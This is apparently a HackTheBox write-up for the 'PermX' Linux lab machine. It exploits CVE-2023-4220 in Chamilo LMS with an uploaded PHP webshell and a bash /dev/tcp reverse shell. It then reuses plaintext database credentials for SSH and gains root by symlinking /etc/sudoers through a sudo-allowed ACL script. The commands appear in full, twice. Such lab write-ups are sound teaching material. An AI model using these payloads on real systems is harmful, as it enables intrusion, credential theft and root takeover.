---
layout: post
title: "PermX - HackTheBox WriteUp"
date: 2024-09-18
categories: [CTF, HackTheBox, WriteUp]
tags: [WebApp, ChamiloLMS, CVE-2023-4220, RCE, FileUpload, PrivEsc, SudoMisconfig, ACL, Linux]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: en
permalink: /en/blog/2024/10/24/permx-htb-writeup/
excerpt: "Linux machine hosting a vulnerable Chamilo LMS. CVE-2023-4220 exploitation for RCE via file upload, then privilege escalation via sudo ACL misconfiguration."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
  <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
    <div class="flex-1">
      <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
        <i class="fas fa-cube mr-3"></i>PermX
      </h2>
      <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
        Chamilo LMS Exploitation + Sudo ACL Privilege Escalation
      </p>
    </div>
    <div class="flex gap-3">
      <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
        <i class="fas fa-circle text-xs mr-1"></i>Easy
      </span>
      <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
        <i class="fab fa-linux mr-1"></i>Linux
      </span>
    </div>
  </div>

  <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
    <div class="flex items-center gap-3">
      <div class="text-green-500 text-xl">
        <i class="fas fa-calendar"></i>
      </div>
      <div>
        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2024-09-18</div>
      </div>
    </div>

    <div class="flex items-center gap-3">
      <div class="text-blue-500 text-xl">
        <i class="fas fa-network-wired"></i>
      </div>
      <div>
        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.10.11.23</div>
      </div>
    </div>

    <div class="flex items-center gap-3">
      <div class="text-purple-500 text-xl">
        <i class="fas fa-shield-alt"></i>
      </div>
      <div>
        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Ubuntu 22.04</div>
      </div>
    </div>

    <div class="flex items-center gap-3">
      <div class="text-amber-500 text-xl">
        <i class="fas fa-star"></i>
      </div>
      <div>
        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">20</div>
      </div>
    </div>
  </div>
</div>


## 🎯 Synopsis

**PermX** is an <span class="text-highlight-green">**easy Linux machine**</span> hosting a <span class="text-highlight-red">**Learning Management System (Chamilo)**</span> vulnerable to an <span class="text-highlight-orange">**unrestricted file upload vulnerability (CVE-2023-4220)**</span>.

Exploiting this vulnerability allows obtaining <span class="text-highlight-blue">**initial access**</span> as the web user `www-data` via remote code execution. System enumeration reveals <span class="text-highlight-red">**plaintext credentials**</span> in the Chamilo configuration file, allowing SSH connection with the `mtz` user. Finally, privilege escalation is achieved via exploiting a <span class="text-highlight-purple">**sudo misconfiguration**</span> on an `acl.sh` script using symbolic links, leading to a <span class="text-highlight-green">**root shell**</span>.

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Required Skills
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Linux terminal usage</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Web and DNS enumeration (subdomain fuzzing)</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>System configuration analysis</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Understanding Linux permissions</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Skills Acquired
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>CMS exploitation (Chamilo LMS)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>File Upload RCE (CVE-2023-4220)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Sudo configuration exploitation</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Symbolic link manipulation for PrivEsc</li>
        </ul>
    </div>
</div>


## 🔍 Phase 1 — Network Reconnaissance

### Initial Port Scan

We start with a quick scan of all TCP ports to identify exposed services:

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.23
```

### Detailed Service Enumeration

Once open ports are identified, we perform a detailed scan with version detection and NSE scripts:

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.23 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.23
```

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Scan Results
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-network-wired"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 22/TCP - SSH</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">OpenSSH 8.9p1 Ubuntu</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Secure remote administration service</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-globe"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Port 80/TCP - HTTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Apache httpd 2.4.52</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Web server hosting the target application</div>
            </div>
        </div>
    </div>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Entry Point Identified:</strong> The web service on port 80 is the most likely initial attack vector. The site redirects to permx.htb.
    </p>
</div>


## 🌐 Phase 2 — Web Enumeration and Virtual Hosts

### Main Domain Discovery

Visiting `http://10.10.11.23`, the site redirects to `permx.htb`. We add it to `/etc/hosts`:

```bash
echo "10.10.11.23 permx.htb" | sudo tee -a /etc/hosts
```

### Subdomain Fuzzing

Header `Host` fuzzing allows discovering additional virtual hosts hosted on the same server:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
     -u http://permx.htb/ \
     -H 'Host: FUZZ.permx.htb' \
     -t 200 -ic -fw 18
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Discovered Subdomains:</strong> 
        <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded font-mono mx-1">www.permx.htb</code>
        <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded font-mono mx-1">lms.permx.htb</code>
    </p>
</div>

We add these subdomains to `/etc/hosts`:

```bash
echo "10.10.11.23 www.permx.htb lms.permx.htb" | sudo tee -a /etc/hosts
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Key Technique:</strong> Header <code>Host</code> fuzzing is an essential enumeration method to discover virtual hosts not listed in public DNS records.
    </p>
</div>

## 💼 Phase 3 — Initial Access via Chamilo LMS

### Application Identification

Accessing `http://lms.permx.htb/`, we discover an installation of **Chamilo LMS**, an open-source learning management system.

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-blue-500">
    <div class="flex items-start gap-4 mb-4">
        <div class="text-4xl text-blue-500">
            <i class="fas fa-graduation-cap"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-xl font-bold text-gray-800 dark:text-gray-200">Chamilo LMS</h4>
            <p class="text-gray-600 dark:text-gray-400">Open-source Learning Management System</p>
        </div>
    </div>
    <p class="text-gray-700 dark:text-gray-300">
        Chamilo is an online learning platform widely used in educational institutions.
    </p>
</div>

### Vulnerability Research

A quick search reveals the <span class="text-highlight-orange">**CVE-2023-4220**</span> vulnerability, allowing **unauthenticated file upload** via the `bigUpload.php` script.


## ⚙️ Phase 4 — Exploitation CVE-2023-4220

### Vulnerability Analysis

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2023-4220 - File Upload RCE
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Affected Application:</span> Chamilo LMS
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type:</span> Remote Code Execution (RCE)
            </div>
        </div>
        <div>
            <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score:</span> 9.8 (Critical)
        </div>
        <div class="mt-4">
            <span class="font-semibold text-red-600 dark:text-red-400">Description:</span><br>
            The <code>bigUpload.php</code> script does not properly validate uploaded file names. An attacker can therefore upload a malicious <code>.php</code> file and execute arbitrary commands server-side without authentication.
        </div>
    </div>
</div>

### Proof of Concept

**Webshell Generation:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Upload via cURL:**

```bash
curl -F 'bigUploadFile=@shell.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Result:</strong> File uploaded successfully
    </p>
</div>

**Functionality Verification:**

```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?cmd=id'
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Shell confirmed as www-data!
    </p>
</div>

### Obtaining a Reverse Shell

**Starting listener on attacking machine:**

```bash
nc -lnvp 4455
```

**Creating reverse shell payload:**

```bash
echo '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.14.12/4455 0>&1'\''"); ?>' > rev.php
```

**Payload Upload:**

```bash
curl -F 'bigUploadFile=@rev.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```

**Reverse Shell Execution:**

```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rev.php'
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Connection established → www-data shell obtained!
    </p>
</div>

## 🔧 Phase 5 — Shell Stabilization and Enumeration

### Shell Improvement

Stabilizing the shell for better interactivity:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 38 columns 160
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Tip:</strong> This technique provides a complete interactive shell with command history and auto-completion.
    </p>
</div>

### Configuration File Enumeration

Web applications often store credentials in their configuration files. We examine the Chamilo configuration file:

```bash
cat /var/www/chamilo/app/config/configuration.php
```

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4 border-l-4 border-green-500">
    <h4 class="text-xl font-bold mb-3 text-green-600 dark:text-green-400 flex items-center">
        <i class="fas fa-key mr-2"></i>Discovered Credentials
    </h4>
    <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded font-mono text-sm">
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">$_configuration['db_user']</span> = <span class="text-green-600 dark:text-green-400">'chamilo'</span>;<br>
            <span class="text-blue-600 dark:text-blue-400">$_configuration['db_password']</span> = <span class="text-green-600 dark:text-green-400">'03F6lY3uXAP2bkW8'</span>;
        </div>
    </div>
</div>

### System User Identification

Checking local users with shell access:

```bash
cat /etc/passwd | grep '/bin/bash'
```

**Result:** The user `mtz` has shell access.

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Plaintext credentials found!</strong> These credentials are potentially reused elsewhere on the system.
    </p>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Technique:</strong> Web application configuration files are goldmines for pivoting — they often contain valid credentials reused on the system.
    </p>
</div>


## 🔐 Phase 6 — SSH Access and User Flag

### SSH Connection

Attempting SSH connection with the discovered password:

```bash
ssh mtz@permx.htb
```

**Password:** `03F6lY3uXAP2bkW8`

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        SSH connection successful!
    </p>
</div>

### Access Validation

```bash
id
whoami
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
    </div>
</div>

### User Flag Retrieval

```bash
cat ~/user.txt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-flag mr-2 text-green-500"></i>
        <strong>USER FLAG OBTAINED!</strong> First step completed.
    </p>
</div>

## 🔍 Phase 7 — Sudo Privileges Verification

### Sudo Rights Analysis

Checking which commands `mtz` can execute with sudo:

```bash
sudo -l
```

<div class="bg-red-50 dark:bg-red-900/20 p-5 rounded-xl shadow-lg my-4 border-l-4 border-red-500">
    <h4 class="text-xl font-bold mb-3 text-red-600 dark:text-red-400 flex items-center">
        <i class="fas fa-exclamation-triangle mr-2"></i>Sudo Configuration Detected
    </h4>
    <div class="bg-red-100 dark:bg-red-800/30 p-3 rounded font-mono text-sm">
        <div class="text-red-600 dark:text-red-400">
            (ALL : ALL) NOPASSWD: /opt/acl.sh
        </div>
    </div>
</div>

<div class="bg-red-100 dark:bg-red-900/20 border-l-4 border-red-500 p-4 my-4 rounded-r-lg">
    <p class="text-red-800 dark:text-red-200">
        <i class="fas fa-search mr-2 text-red-500"></i>
        <strong>Escalation Vector Identified:</strong> The user <code>mtz</code> can execute <code>/opt/acl.sh</code> as any user <strong>without password</strong>.
    </p>
</div>

### Script Analysis /opt/acl.sh

Examining the script content:

```bash
cat /opt/acl.sh
```

```bash
#!/bin/bash
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    echo "Access denied."
    exit 1
fi

if [ ! -f "$target" ]; then
    echo "Target must be a file."
    exit 1
fi

sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

**Script Analysis:**

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4 border-l-4 border-purple-500">
    <h4 class="text-xl font-bold mb-4 text-purple-600 dark:text-purple-400 flex items-center">
        <i class="fas fa-code mr-2"></i>Vulnerability Analysis
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li><i class="fas fa-check text-green-500 mr-2"></i>The script verifies that the target file is in <code>/home/mtz/</code></li>
        <li><i class="fas fa-check text-green-500 mr-2"></i>Applies ACL permissions to this file</li>
        <li><i class="fas fa-check text-green-500 mr-2"></i>Executed with <code>sudo</code>, therefore <strong>root</strong> controls <code>setfacl</code></li>
        <li><i class="fas fa-exclamation-triangle text-red-500 mr-2"></i><strong>Vulnerability:</strong> No symbolic link verification!</li>
    </ul>
</div>

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-lightbulb mr-2 text-amber-500"></i>
        <strong>Possible Exploitation:</strong> By creating a <strong>symbolic link</strong> in <code>/home/mtz</code> pointing to a system file (like <code>/etc/sudoers</code>), we can bypass the restriction and modify critical system files.
    </p>
</div>


## 👑 Phase 8 — Privilege Escalation via Symbolic Links

### Exploitation Strategy

The vulnerability of the `acl.sh` script lies in the absence of symbolic link verification. We will:

1. Create a symbolic link in `/home/mtz` pointing to `/etc/sudoers`
2. Use the script to grant write permissions via ACL
3. Modify `/etc/sudoers` to obtain full root access

### Exploitation

**Creating the symbolic link:**

```bash
ln -s /etc/sudoers /home/mtz/root
```

**Applying ACL permissions via the vulnerable script:**

```bash
sudo /opt/acl.sh mtz rw /home/mtz/root
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Success:</strong> ACL permissions are now applied to the <code>/etc/sudoers</code> file via the symbolic link!
    </p>
</div>

**Modifying the sudoers file:**

```bash
echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
```

**Verifying the modification:**

```bash
cat /etc/sudoers | tail -1
```

**Escalating to root:**

```bash
sudo bash
```

### Exploitation Result

```bash
id
whoami
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=0(root) gid=0(root) groups=0(root)
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        <strong>ROOT SHELL OBTAINED!</strong> Maximum privileges achieved.
    </p>
</div>

## 🏁 Phase 9 — Flag Extraction

### Root Flag Retrieval

With root access, we can now retrieve the root flag:

```bash
cat /root/root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag:</strong> /home/mtz/user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag:</strong> /root/root.txt
            </p>
        </div>
    </div>
</div>

## 📋 Phase 10 — Recommendations and Remediation

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-start">
            <i class="fas fa-globe mr-2 mt-1"></i><span>Application</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Update Chamilo to fix CVE-2023-4220</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Secure credentials (encryption, vault)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Validate extensions and MIME types for uploads</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Isolate sensitive configuration files</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-blue-500">
        <h4 class="text-xl font-bold text-blue-600 dark:text-blue-400 mb-4 flex items-start">
            <i class="fas fa-server mr-2 mt-1"></i><span>System</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Limit sudo script access — never allow file-manipulating scripts to non-root users</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Verify symbolic links in sudo scripts</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Regularly audit sudo configurations (<code>sudo -l</code>)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Monitor critical system file modifications</span>
            </li>
        </ul>
    </div>
</div>

---

## 📝 Command Summary

```bash
# Network reconnaissance
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.23
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.23 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.23

# Subdomain fuzzing
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
     -u http://permx.htb/ -H 'Host: FUZZ.permx.htb' -t 200 -ic -fw 18

# RCE Upload via CVE-2023-4220
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F 'bigUploadFile=@shell.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'

# Reverse shell
echo '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.14.12/4455 0>&1'\''"); ?>' > rev.php
curl -F 'bigUploadFile=@rev.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rev.php'

# Shell stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 38 columns 160

# Configuration file enumeration
cat /var/www/chamilo/app/config/configuration.php

# SSH connection
ssh mtz@permx.htb

# Sudo ACL exploitation
ln -s /etc/sudoers /home/mtz/root
sudo /opt/acl.sh mtz rw /home/mtz/root
echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
sudo bash
```

---

## 🔗 Attack Chain Summary

<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
        <i class="fas fa-project-diagram mr-2"></i>Complete Attack Path
    </h3>
    <div class="space-y-4">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance and Enumeration</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → permx.htb → ffuf → lms.permx.htb</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">Exploitation and Initial Access</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">CVE-2023-4220 → File Upload RCE → www-data shell</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">Enumeration and Pivoting</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">configuration.php → plaintext creds → SSH mtz</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Privilege Escalation</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Sudo acl.sh → Symbolic link → /etc/sudoers → Root shell</div>
            </div>
        </div>
    </div>
</div>

---

## 🏷️ Tags & References

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">WebApp</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">ChamiloLMS</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2023-4220</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">RCE</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">FileUpload</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PrivEsc</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SudoMisconfig</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(14, 165, 233, 0.1); color: #0ea5e9; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">ACL</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(107, 114, 128, 0.1); color: #6b7280; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Linux</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(6, 182, 212, 0.1); color: #06b6d4; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">HackTheBox</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Useful References
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-4220" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2023-4220 - Chamilo LMS File Upload RCE
            </a>
        </li>
        <li>
            <a href="https://www.chamilo.org/security/" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Chamilo Security Advisories
            </a>
        </li>
        <li>
            <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Linux ACL Privilege Escalation Techniques
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/en/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Back to blog
    </a>
</div>
